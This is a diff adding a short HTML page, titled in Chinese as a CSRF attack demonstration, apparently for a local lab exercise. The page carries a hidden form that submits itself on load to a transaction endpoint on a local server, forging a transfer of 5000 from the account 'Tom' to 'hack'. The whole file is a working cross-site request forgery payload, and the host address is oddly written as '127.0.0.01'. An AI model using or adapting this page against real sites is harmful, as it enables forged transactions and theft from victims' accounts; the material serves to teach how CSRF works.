@@ -1,0 +1,15 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title>csrf 攻击演示</title>
+</head>
+<body>
+<form action="http://127.0.0.01:1999/transaction" method=POST>
+    <input type="hidden" name="Id" value="Tom" />
+    <input type="hidden" name="money" value="5000" />
+    <input type="hidden" name="toId" value="hack" />
+</form>
+<script> document.forms[0].submit(); </script>
+</body>
+</html>
